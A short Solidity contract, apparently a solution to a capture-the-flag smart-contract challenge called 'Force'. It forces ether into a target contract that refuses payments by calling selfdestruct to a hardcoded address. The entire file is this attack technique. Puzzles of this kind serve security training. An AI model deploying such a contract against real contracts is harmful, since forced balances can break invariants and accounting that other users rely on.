pragma solidity ^0.4.20;

contract forceHack {
    function collect() public payable returns(uint) {
        return address(this).balance;
    }
    function selfDestroy() public {
        address addr = 0x0108b21039d35ac3bd8e8380e7c68e858a3153cf; //your force.sol instance goes here
        selfdestruct(addr);
    }
    }